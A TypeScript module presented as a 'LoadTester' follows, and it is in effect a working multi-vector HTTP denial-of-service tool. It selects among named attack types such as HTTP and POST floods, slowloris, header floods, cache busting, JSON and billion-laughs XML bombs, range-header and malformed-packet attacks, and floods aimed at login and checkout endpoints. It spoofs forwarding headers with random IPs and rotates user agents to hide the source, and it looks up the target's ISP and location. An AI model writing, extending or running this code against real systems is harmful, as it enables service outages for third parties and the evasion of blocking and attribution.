import { TestConfig, WorkerStatus, LogEntry, MetricDataPoint, TestResults, TargetInfo } from "@shared/schema";
import { EventEmitter } from "events";
import { lookup } from "dns";
import { promisify } from "util";

const dnsLookup = promisify(lookup);

interface WorkerState {
  id: number;
  status: "active" | "idle" | "error";
  requests: number;
  totalLatency: number;
  lastLatency: number;
  errors: number;
}

export class LoadTester extends EventEmitter {
  private workers: WorkerState[] = [];
  private isRunning: boolean = false;
  private config: TestConfig | null = null;
  private startTime: number = 0;
  private totalRequests: number = 0;
  private successfulRequests: number = 0;
  private failedRequests: number = 0;
  private logs: LogEntry[] = [];
  private chartData: MetricDataPoint[] = [];
  private latencyData: MetricDataPoint[] = [];
  private metricsInterval: NodeJS.Timeout | null = null;
  private workerIntervals: NodeJS.Timeout[] = [];
  private targetInfo: TargetInfo | null = null;

  async start(config: TestConfig) {
    if (this.isRunning) {
      throw new Error("Load test is already running");
    }

    this.config = config;
    this.isRunning = true;
    this.startTime = Date.now();
    this.totalRequests = 0;
    this.successfulRequests = 0;
    this.failedRequests = 0;
    this.logs = [];
    this.chartData = [{ time: "0s", requests: 0, latency: 0 }];
    this.latencyData = [{ time: "0s", requests: 0, latency: 0 }];

    await this.resolveTargetInfo(config.targetUrl);

    this.workers = Array.from({ length: config.workerCount }, (_, i) => ({
      id: i + 1,
      status: "active",
      requests: 0,
      totalLatency: 0,
      lastLatency: 0,
      errors: 0,
    }));

    this.emit("update", this.getResults());

    this.startWorkers();
    this.startMetricsCollection();

    setTimeout(() => {
      this.stop();
    }, config.duration * 1000);
  }

  private async resolveTargetInfo(targetUrl: string) {
    try {
      const url = new URL(targetUrl);
      const hostname = url.hostname;
      
      const { address } = await dnsLookup(hostname, { family: 4 });
      const ipAddresses = [address];
      
      try {
        const ipInfoResponse = await fetch(`https://ipapi.co/${address}/json/`);
        if (ipInfoResponse.ok) {
          const ipInfo = await ipInfoResponse.json();
          this.targetInfo = {
            hostname,
            ipAddresses,
            isp: ipInfo.org || ipInfo.asn,
            country: ipInfo.country_name,
            city: ipInfo.city,
            org: ipInfo.org,
          };
          return;
        }
      } catch (error) {
        console.log("Could not fetch ISP info, continuing without it");
      }
      
      this.targetInfo = {
        hostname,
        ipAddresses,
      };
    } catch (error) {
      console.error("Error resolving target info:", error);
      this.targetInfo = null;
    }
  }

  stop() {
    if (!this.isRunning) return;

    this.isRunning = false;
    this.workerIntervals.forEach(interval => clearInterval(interval));
    this.workerIntervals = [];
    
    if (this.metricsInterval) {
      clearInterval(this.metricsInterval);
      this.metricsInterval = null;
    }

    this.workers = this.workers.map(w => ({ ...w, status: "idle" as const }));
    this.emit("stopped");
  }

  private getRandomUserAgent(): string {
    const userAgents = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  private getRandomIP(): string {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }

  private startWorkers() {
    if (!this.config) return;

    const requestsPerWorker = Math.ceil(this.config.requestRate / this.config.workerCount);
    const delayBetweenRequests = 1000 / requestsPerWorker;

    this.workers.forEach((worker, index) => {
      const interval = setInterval(async () => {
        if (!this.isRunning || !this.config) {
          return;
        }

        try {
          worker.status = "active";
          let method = "GET";
          let body: string | undefined = undefined;
          let targetUrl = this.config.targetUrl;
          const headers: Record<string, string> = {
            "User-Agent": this.config.rotateUserAgent ? this.getRandomUserAgent() : "LoadTester/1.0",
          };
          let timeoutDuration = 5000;
          let artificialDelay = 0;
          
          // Add IP anonymization headers if enabled
          if (this.config.anonymizeIP) {
            headers["X-Forwarded-For"] = this.getRandomIP();
            headers["X-Real-IP"] = this.getRandomIP();
            headers["X-Originating-IP"] = this.getRandomIP();
            headers["CF-Connecting-IP"] = this.getRandomIP();
          }

          // Add custom headers if provided
          if (this.config.customHeaders) {
            Object.assign(headers, this.config.customHeaders);
          }
          
          switch (this.config.attackType) {
            case "http_flood":
              method = "GET";
              break;
              
            case "post_flood":
              method = "POST";
              body = JSON.stringify({ data: "x".repeat(Math.floor(Math.random() * 3000) + 1000) });
              headers["Content-Type"] = "application/json";
              break;
              
            case "slowloris":
              method = "GET";
              headers["Connection"] = "keep-alive";
              headers["Keep-Alive"] = "timeout=600, max=1000";
              headers["X-a"] = "b";
              timeoutDuration = 30000;
              artificialDelay = Math.floor(Math.random() * 3000) + 2000; // 2-5s delay
              break;
              
            case "mixed":
              method = Math.random() > 0.5 ? "GET" : "POST";
              if (method === "POST") {
                body = JSON.stringify({ data: "x".repeat(Math.floor(Math.random() * 5000)) });
                headers["Content-Type"] = "application/json";
              }
              break;
              
            case "http_header_flood":
              method = "GET";
              // Add many headers to overwhelm the server
              for (let i = 0; i < 50; i++) {
                headers[`X-Custom-Header-${i}`] = `Value-${Math.random().toString(36).substring(7)}-${"x".repeat(100)}`;
              }
              artificialDelay = Math.floor(Math.random() * 500) + 200; // 200-700ms
              break;
              
            case "cache_buster":
              method = "GET";
              // Add random query parameters to bypass caching
              const url = new URL(this.config.targetUrl);
              url.searchParams.append("_cb", Date.now().toString());
              url.searchParams.append("_rand", Math.random().toString(36).substring(7));
              url.searchParams.append("_worker", worker.id.toString());
              targetUrl = url.toString();
              break;
              
            case "json_bomb":
              method = "POST";
              // Create deeply nested JSON
              let jsonBomb: any = { data: "start" };
              let current = jsonBomb;
              for (let i = 0; i < 50; i++) {
                current.nested = { level: i, data: "x".repeat(100) };
                current = current.nested;
              }
              body = JSON.stringify(jsonBomb);
              headers["Content-Type"] = "application/json";
              artificialDelay = Math.floor(Math.random() * 800) + 400; // 400-1200ms
              break;
              
            case "range_header_attack":
              method = "GET";
              // Request multiple byte ranges
              const ranges = Array.from({ length: 20 }, (_, i) => `${i * 1000}-${i * 1000 + 999}`);
              headers["Range"] = `bytes=${ranges.join(", ")}`;
              headers["Accept-Encoding"] = "gzip, deflate, br";
              artificialDelay = Math.floor(Math.random() * 600) + 300; // 300-900ms
              break;
              
            case "compression_bomb":
              method = "POST";
              // Send highly compressible data
              const pattern = "AAAABBBBCCCCDDDD";
              body = pattern.repeat(500); // Highly compressible
              headers["Content-Type"] = "text/plain";
              headers["Content-Encoding"] = "gzip";
              artificialDelay = Math.floor(Math.random() * 700) + 400; // 400-1100ms
              break;
              
            case "connection_exhaustion":
              method = "GET";
              headers["Connection"] = "keep-alive";
              headers["Keep-Alive"] = "timeout=300, max=100";
              timeoutDuration = 15000;
              artificialDelay = Math.floor(Math.random() * 2000) + 1500; // 1.5-3.5s delay
              break;
              
            case "recursive_get":
              method = "GET";
              headers["Accept"] = "*/*";
              headers["Referer"] = this.config.targetUrl;
              // Add some random path to simulate recursive crawling
              const url2 = new URL(this.config.targetUrl);
              const paths = ['/api', '/assets', '/static', '/images', '/js', '/css'];
              url2.pathname = paths[Math.floor(Math.random() * paths.length)] + '/' + Math.random().toString(36).substring(7);
              targetUrl = url2.toString();
              artificialDelay = Math.floor(Math.random() * 400) + 100; // 100-500ms
              break;
              
            case "ssl_renegotiation":
              method = "GET";
              headers["Connection"] = "close";
              headers["Upgrade-Insecure-Requests"] = "1";
              timeoutDuration = 10000;
              artificialDelay = Math.floor(Math.random() * 1200) + 800; // 800-2000ms
              break;
              
            case "fragmented_packets":
              method = "POST";
              // Simulate fragmentation by sending data in chunks
              const fragmentSize = Math.floor(Math.random() * 100) + 50;
              body = "x".repeat(fragmentSize) + "\r\n" + "y".repeat(fragmentSize);
              headers["Content-Type"] = "application/octet-stream";
              headers["Transfer-Encoding"] = "chunked";
              artificialDelay = Math.floor(Math.random() * 500) + 300; // 300-800ms
              break;
              
            case "malformed_packets":
              method = "POST";
              // Send intentionally malformed data
              body = "<?xml version='1.0'?>\r\n\r\n<root>\x00\xFF\xFE</invalid>";
              headers["Content-Type"] = "application/xml; charset=invalid";
              headers["Content-Length"] = (body.length + 100).toString(); // Wrong content length
              artificialDelay = Math.floor(Math.random() * 400) + 200; // 200-600ms
              break;
              
            case "protocol_abuse":
              method = "GET";
              headers["Expect"] = "100-continue";
              headers["TE"] = "trailers, chunked";
              headers["Upgrade"] = "websocket";
              headers["Transfer-Encoding"] = "chunked, gzip";
              artificialDelay = Math.floor(Math.random() * 600) + 400; // 400-1000ms
              break;
              
            case "application_layer_flood":
              method = "POST";
              // Target common resource-intensive endpoints
              const endpoints = ['/search', '/api/query', '/login', '/checkout', '/calculate'];
              const url3 = new URL(this.config.targetUrl);
              url3.pathname = endpoints[Math.floor(Math.random() * endpoints.length)];
              targetUrl = url3.toString();
              body = JSON.stringify({
                query: "x".repeat(1000),
                filters: Array(100).fill({ field: "value", operator: "equals" }),
                sort: Array(50).fill({ field: "name", direction: "asc" }),
              });
              headers["Content-Type"] = "application/json";
              artificialDelay = Math.floor(Math.random() * 1000) + 500; // 500-1500ms
              break;
              
            case "xml_bomb":
              method = "POST";
              // Billion laughs attack (exponential entity expansion)
              body = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>`;
              headers["Content-Type"] = "application/xml";
              artificialDelay = Math.floor(Math.random() * 1200) + 600; // 600-1800ms
              break;
              
            case "pipeline":
              // Execute multiple attack types in sequence
              const pipelineAttacks = this.config.pipeline || ["http_flood", "post_flood", "slowloris"];
              const randomAttack = pipelineAttacks[Math.floor(Math.random() * pipelineAttacks.length)];
              // Recursively call with a different attack type
              const pipelineConfig = { ...this.config, attackType: randomAttack as any };
              this.config = pipelineConfig;
              // Re-run the switch with the new attack type
              return; // Will be picked up on next iteration
          }

          // Add artificial delay before request for certain attack types
          if (artificialDelay > 0) {
            await new Promise(resolve => setTimeout(resolve, artificialDelay));
          }

          const startTime = Date.now();
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), timeoutDuration);

          const response = await fetch(targetUrl, {
            method,
            signal: controller.signal,
            headers,
            body,
          }).catch((error) => {
            if (error.name === 'AbortError') {
              return { ok: false, status: 408, statusText: 'Timeout' } as Response;
            }
            return { ok: false, status: 0, statusText: error.message } as Response;
          });

          clearTimeout(timeout);
          const latency = Date.now() - startTime + artificialDelay; // Include artificial delay in latency

          worker.requests++;
          worker.totalLatency += latency;
          worker.lastLatency = latency;
          this.totalRequests++;

          const status = response.status || 0;
          if (response.ok) {
            this.successfulRequests++;
            worker.status = "active";
          } else {
            this.failedRequests++;
            worker.errors++;
            if (worker.errors > 10) {
              worker.status = "error";
            } else {
              worker.status = "active";
            }
          }

          const now = new Date();
          const timestamp = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
          
          const logEntry: LogEntry = {
            id: `${Date.now()}-${worker.id}`,
            timestamp,
            method,
            url: this.config.targetUrl,
            status,
            latency,
            workerId: worker.id,
          };

          this.logs.push(logEntry);
          if (this.logs.length > 100) {
            this.logs = this.logs.slice(-100);
          }

          this.emit("update", this.getResults());
        } catch (error) {
          worker.status = "error";
          worker.errors++;
          this.failedRequests++;
        }
      }, delayBetweenRequests);

      this.workerIntervals.push(interval);
    });
  }

  private startMetricsCollection() {
    let lastRequestCount = 0;
    let elapsedSeconds = 0;

    this.metricsInterval = setInterval(() => {
      if (!this.isRunning) return;

      elapsedSeconds++;
      const requestsThisSecond = this.totalRequests - lastRequestCount;
      lastRequestCount = this.totalRequests;

      const avgLatency = this.workers.reduce((sum, w) => {
        return sum + (w.requests > 0 ? w.totalLatency / w.requests : 0);
      }, 0) / Math.max(this.workers.length, 1);

      const dataPoint: MetricDataPoint = {
        time: `${elapsedSeconds}s`,
        requests: requestsThisSecond,
        latency: Math.round(avgLatency),
      };

      this.chartData.push(dataPoint);
      this.latencyData.push(dataPoint);

      if (this.chartData.length > 30) {
        this.chartData = this.chartData.slice(-30);
      }
      if (this.latencyData.length > 30) {
        this.latencyData = this.latencyData.slice(-30);
      }

      this.emit("update", this.getResults());
    }, 1000);
  }

  getResults(): TestResults {
    const currentRps = this.chartData.length > 0 
      ? this.chartData[this.chartData.length - 1].requests 
      : 0;

    const avgLatency = this.workers.reduce((sum, w) => {
      return sum + (w.requests > 0 ? w.totalLatency / w.requests : 0);
    }, 0) / Math.max(this.workers.length, 1);

    const successRate = this.totalRequests > 0
      ? (this.successfulRequests / this.totalRequests) * 100
      : 100;

    return {
      totalRequests: this.totalRequests,
      successRate,
      avgLatency: Math.round(avgLatency),
      currentRps,
      failedRequests: this.failedRequests,
      workers: this.workers.map(w => ({
        id: w.id,
        status: w.status,
        requests: w.requests,
        latency: w.lastLatency,
      })),
      logs: this.logs.slice(-50),
      chartData: this.chartData,
      latencyData: this.latencyData,
      targetInfo: this.targetInfo || undefined,
    };
  }

  getIsRunning(): boolean {
    return this.isRunning;
  }
}

export const loadTester = new LoadTester();
